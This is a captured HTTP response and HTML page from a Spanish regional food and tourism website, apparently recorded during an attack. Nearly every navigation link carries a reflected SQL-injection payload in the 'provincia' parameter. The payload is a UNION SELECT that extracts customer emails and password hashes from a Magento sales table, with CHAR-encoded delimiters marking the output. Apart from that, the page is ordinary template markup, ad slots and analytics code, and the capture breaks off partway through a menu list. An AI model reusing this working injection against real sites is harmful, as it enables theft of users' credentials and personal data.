@@ -1,0 +1,418 @@
+HTTP/1.1 200 OK
+Date: Mon, 13 May 2019 19:54:32 GMT
+Server: Apache/2.2.22 (Debian)
+X-Powered-By: PHP/5.4.45-0+deb7u14
+Set-Cookie: PHPSESSID=90hmvmi1vk4l8e8q7uurncon83; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 35157
+Connection: close
+Content-Type: text/html
+
+<!DOCTYPE html>
+<!--[if IE 8]>          <html class="ie ie8"> <![endif]-->
+<!--[if IE 9]>          <html class="ie ie9"> <![endif]-->
+<!--[if gt IE 9]><!-->  
+
+<html lang="es">
+  <head>
+   <!-- <meta charset="utf-8">-->
+       <meta charset="ISO-8859-15">
+
+	
+	
+	<title>Recetas típicas  - Comidas típicas  - Postres típicos  - Recetas tradicionales </title>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-1"/>
+<meta name='description' content='Recetas típicas de  - Recetas de  - Recetas de cocina de  - Recetas de '/>
+<meta name='keywords' content='recetas de cocina, recetas típicas'/>
+<meta name='author' content='Gespro Informatics S.l'/>
+<meta name='google-site-verification' content='azZ-wO-ca5lysiRFjcMtMBLXub2BEr6IDFoKW8zmvcM' />
+	
+	 
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	
+<meta property="fb:app_id" content="169911683067973">
+
+	<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-1831113-8");
+pageTracker._trackPageview();
+} catch(err) {}</script>
+
+
+
+
+ <!-- Google Fonts -->
+        <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800' rel='stylesheet' type='text/css'>
+        <link href='http://fonts.googleapis.com/css?family=Raleway:100,200,300,700,800,900' rel='stylesheet' type='text/css'>
+        <!-- Library CSS -->
+        <link rel="stylesheet" href="css/bootstrap.css">
+        <link rel="stylesheet" href="css/bootstrap-theme.css">
+        <link rel="stylesheet" href="css/fonts/font-awesome/css/font-awesome.css">
+        <link rel="stylesheet" href="css/animations.css" media="screen">
+        <link rel="stylesheet" href="css/superfish.css" media="screen">
+        <link rel="stylesheet" href="css/revolution-slider/css/settings.css" media="screen">
+        <link rel="stylesheet" href="css/revolution-slider/css/extralayers.css" media="screen">
+        <link rel="stylesheet" href="css/prettyPhoto.css" media="screen">
+        <!-- Theme CSS -->
+        <link rel="stylesheet" href="css/style.css">
+        <!-- Skin -->
+        <link rel="stylesheet" href="css/colors/red.css" class="colors">
+        <!-- Responsive CSS -->
+        <link rel="stylesheet" href="css/theme-responsive.css">
+        <!-- Switcher CSS -->
+        <link href="css/switcher.css" rel="stylesheet">
+        <link href="css/spectrum.css" rel="stylesheet">
+        <!-- Favicons -->
+        <link rel="shortcut icon" href="img/ico/favicon.ico">
+        <link rel="apple-touch-icon" href="img/ico/apple-touch-icon.png">
+        <link rel="apple-touch-icon" sizes="72x72" href="img/ico/apple-touch-icon-72.png">
+        <link rel="apple-touch-icon" sizes="114x114" href="img/ico/apple-touch-icon-114.png">
+        <link rel="apple-touch-icon" sizes="144x144" href="img/ico/apple-touch-icon-144.png">
+        <!-- The HTML5 shim, for IE6-8 support of HTML5 elements -->
+        <!--[if lt IE 9]>
+        <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
+        <script src="js/respond.min.js"></script>
+        <![endif]-->
+        <!--[if IE]>
+        <link rel="stylesheet" href="css/ie.css">
+        <![endif]-->
+        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    </head>
+       <body class="home">
+        <div class="page-mask">
+            <div class="page-loader">
+                <div class="spinner"></div>
+                Cargando..
+            </div>
+        </div>
+        <!-- Wrap -->
+        <div class="wrap">
+            <!-- Header -->
+            <header id="header">
+                <!-- Header Top Bar -->
+                <div class="top-bar">
+                    <div class="slidedown collapse">
+                        <div class="container">
+                            <div class="pull-left col-md-1">
+                                <ul class="social pull-left">
+                                    <li class="facebook"><a href="#"><i class="fa fa-facebook"></i></a></li>
+                                    <li class="twitter"><a href="#"><i class="fa fa-twitter"></i></a></li>
+                                  <!--  <li class="dribbble"><a href="#"><i class="fa fa-dribbble"></i></a></li>
+                                    <li class="linkedin"><a href="#"><i class="fa fa-linkedin"></i></a></li>
+                                    <li class="rss"><a href="#"><i class="fa fa-rss"></i></a></li>-->
+                                </ul>
+                            </div>    
+                            <div class="phone-login pull-right col-md-11">
+<div class="publi col-md-8">
+<!-- Parte superior -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-2462719613289084"
+     data-ad-slot="9594063705"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+</div>
+<div class="col-md-4">
+<form action="http://www.grgastronomia.com/busqueda_google.php" id="cse-search-box">
+  <div>
+    <input type="hidden" name="cx" value="partner-pub-2462719613289084:tvt4cq-bcc5" />
+    <input type="hidden" name="cof" value="FORID:11" />
+    <input type="hidden" name="ie" value="ISO-8859-1" />
+    <input type="text" name="q" size="25" />
+    <input type="submit" name="sa" value="Buscar" />
+  </div>
+</form>
+<script type="text/javascript" src="http://www.google.es/cse/brand?form=cse-search-box&amp;lang=es"></script>
+</div> 
+
+                              <!--  <a><i class="fa fa-phone"></i> Call Us : +880 111-111-111</a>
+                                <a href="#" data-toggle="modal" data-target="#loginModal"><i class="fa fa-sign-in"></i> Login</a>
+                                <a href="#" data-toggle="modal" data-target="#registrationModal"><i class="fa fa-edit"></i> Registration</a>-->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- /Header Top Bar -->
+                <!-- Main Header -->
+                <div class="main-header">
+                    <div class="container">
+                        <!-- TopNav -->
+                        <div class="topnav navbar-header">
+                            <a class="navbar-toggle down-button" data-toggle="collapse" data-target=".slidedown">
+                            <i class="fa fa-angle-down icon-current"></i>
+                            </a> 
+                        </div>
+                        <!-- /TopNav-->
+                        <!-- Logo -->
+                     
+                        <div class="pull-left logo">
+                        	 
+                            <h1 class="logo">
+                                <a href="index.php">
+                                	GR Gastronomía
+                              <!--  <img class="logo-color" src="img/logos/logo_green.png" alt="gallaxy" width="160" height="60">-->
+                                </a>
+                            </h1>
+                        </div>
+                              <!-- /Logo -->
+                        <!-- Mobile Menu -->
+                        <div class="mobile navbar-header">
+                            <a class="navbar-toggle" data-toggle="collapse" href=".navbar-collapse">
+                            <i class="fa fa-bars fa-2x"></i>
+                            </a> 
+                        </div>
+                        <!-- /Mobile Menu -->
+                        <!-- Menu Start -->
+                        <nav class="collapse navbar-collapse menu">
+                            <ul class="nav navbar-nav sf-menu">
+								           	        		 
+        		<li><a href="restaurantesdetalle.php?provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" >Restaurantes</a></li>
+        		<li><a href="hotelesycasasruralesconencantodetalle.php?provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" >Casas Rurales</a></li>
+        		<li><a href="vinosdetalle.php?provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" >Bodegas</a></li>
+        		            <li><a href="linksdegastronomia.php" >Enlaces amigos</a></li>
+            <!--<li><a class="button red"  href="tienda.php" >Tienda online</a></li> -->
+            <li><a href="publicidad.php" >Tarifas publicidad</a></li> 
+            <li><a href="contactar.php" >Contactar</a></li> 						   </ul>
+						</nav>
+                        <!-- /Menu --> 
+                    </div>
+                </div>
+                <!-- /Main Header -->
+            </header><div class="main" id="main-three-columns">
+										
+<!-- 200x200, creado 13/09/10 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:200px;height:200px"
+     data-ad-client="ca-pub-2462719613289084"
+     data-ad-slot="1925583444"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+						
+				
+			
+				
+
+	
+				
+														
+						<div class="widget category">
+                           <h3 class="title"><span>Gastronomía</span></h3>
+							
+								<ul class="big-list tags">
+                                <li><a href="platostipicosdetalle.php?seccio=platostipicos&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Platos típicos </a></li>
+								<li><a href="platostipicosdetalle.php?seccio=semana-santa&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Platos típicos Semana Santa</a></li>
+								<li><a href="productostipicosdetalle.php?seccio=tipicos&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Productos típicos</a></li>
+								<li><a href="productostipicosdetalle.php?seccio=comprar-productos-tipicos&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Comprar productos típicos</a></li>
+								<!--<li><a href="nuestrasrecetas.php?" class="link1">Nuestras recetas</a></li>-->
+								<li><a href="recetasdecocinadetalle.php?seccio=En General&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Recetas típicas</a></li>
+								<li><a href="recetasdecocinadetalle.php?seccio=semana-santa&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Recetas típicas Semana Santa</a></li>
+								<!--<li><a href="denominaciondeorigendetalle.php?seccio=dop&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Denominaciones de origen</a></li>-->
+								<li><a href="vinosdetalle.php?provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Vinos y bodegas</a></li>
+								<li><a href="productostipicosdetalle.php?seccio=comprar-vinos&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Comprar Vinos</a></li>
+								<li><a href="restaurantesdetalle.php?provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Restaurantes</a></li>
+							        </ul>
+					 	      
+					    </div>
+                                         
+
+						<div class="widget category">
+                           <h3 class="title">Rutas gastronómicas</h3>
+							
+			
+								<ul class="big-list tags">
+								<li><a href="rutas-gastronomiadetalle.php?seccio=Rutas gastronomicas&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Rutas gastronómicas</a></li>
+								<li><a href="rutas-gastronomiadetalle.php?seccio=Rutas de vino&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Rutas de vinos y bodegas</a></li>
+								<li><a href="rutas-gastronomiadetalle.php?seccio=Rutas de tapeo&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Rutas de bares de tapeo</a></li>
+							        </ul>
+						</div>
+					     
+
+					<div class="widget category">
+                           <h3 class="title">Turismo en general</h3>
+							
+								<ul class="big-list tags">
+								<li><a href="ocio.php?seccio=Ocio&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Guías de Turismo</a></li>
+								<li><a href="ocio.php?seccio=rutas&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Rutas Turísticas</a></li>
+								<li><a href="ocio.php?seccio=transporte&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Transporte público,mapas y carreteras</a></li>
+							        </ul>
+				
+					      </div>
+					<div class="widget category">
+                           <h3 class="title">Turismo cultural</h3>
+							
+								<ul class="big-list tags">
+								<li><a href="ocio.php?seccio=Museos&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Museos y salas de arte</a></li>
+								<li><a href="feriasyfiestas.php?seccio=romerias&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Fiestas y Romerias</a></li>
+								<li><a href="feriasyfiestas.php?seccio=mercados&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Ferias y Mercados</a></li>
+								<li><a href="feriasyfiestas.php?seccio=semanasanta&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Semana Santa</a></li>
+								<li><a href="feriasyfiestas.php?seccio=carnaval&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Carnavales</a></li>
+								<li><a href="ocio.php?seccio=Comarcas&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Conozca y visite las comarcas</a></li>
+								<li><a href="ocio.php?seccio=Pueblos&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Conozca y visite los pueblos</a></li>
+								<li><a href="ocio.php?seccio=Monumentos&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Monumentos y patrimonio</a></li>
+								<li><a href="productostipicosdetalle.php?seccio=artesanos&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Productos típicos de artesanía</a></li>
+							        </ul>
+						 
+					    </div>
+					<div class="widget category">
+                           <h3 class="title">Turismo rural</h3>
+								<ul class="big-list tags">
+								<li><a href="ocio.php?seccio=Parques Naturales&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Parques naturales</a></li>
+								<li><a href="ecoturismo.php?seccio=ecoturismo&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Ecoturismo - Micoturismo</a></li>
+								<li><a href="ecoturismo.php?seccio=fauna-flora&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Fauna y Flora</a></li>
+								<li><a href="ecoturismo.php?seccio=micoturismo-setas&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Setas - Hongos</a></li>
+								<li><a href="ocio.php?seccio=Campings y Albergues&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Campings, albergues, refugios y balnearios</a></li>
+								<li><a href="hotelesycasasruralesconencantodetalle.php?provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Hoteles y Casas Rurales</a></li>
+							        </ul>
+				
+					</div>
+                    <div class="widget category">
+                           <h3 class="title">Turismo activo</h3>
+						
+								<ul class="big-list tags">
+								<li><a href="deportes.php?seccio=Senderismo GR&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Senderismo y senderos GR</a></li>
+								<li><a href="deportes.php?seccio=Senderismo PR&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Senderismo y senderos PR</a></li>
+								<li><a href="deportes.php?seccio=BTT&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Cicloturismo y BTT</a></li>
+								<li><a href="deportes.php?seccio=Otros&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Otros deportes</a></li>
+								<li><a href="playasygolf.php?seccio=playas&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Playas</a></li>
+								<li><a href="playasygolf.php?seccio=playas-nudistas&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Playas nudistas</a></li>
+								<li><a href="playasygolf.php?seccio=golf&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Golf</a></li>
+								<li><a href="ocio.php?seccio=Turismo Familiar&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Turismo familiar</a></li>
+								<li><a href="ocio.php?seccio=activo&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Turismo Accesible y Adaptado</a></li>
+							</div>
+				
+
+                      <div class="widget category">
+                           <h3 class="title">Ocio en general</h3>
+							<ul class="big-list tags">
+								<li><a href="ocio.php?seccio=guias&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Guias de ocio</a></li>
+								<li><a href="ocio.php?seccio=parques&amp;provincia=Teruel' AND 1=2 uNiON all SEleCT (select CONCAT(CHAR(100,100,100),CHAR(91,88,93),GROUP_CONCAT(t.customer_email,char(58),t.password_hash),CHAR(91,88,88,93)) FROM (SELECT+customer_email,password_hash FROM f_magento.`mag_sales_flat_quote` WHERE `customer_email` LIKE char(37,64,37) LIMIT 0,5)t   limit 0,1 )  #" class="link1">Parques temáticos y de ocio</a></li>
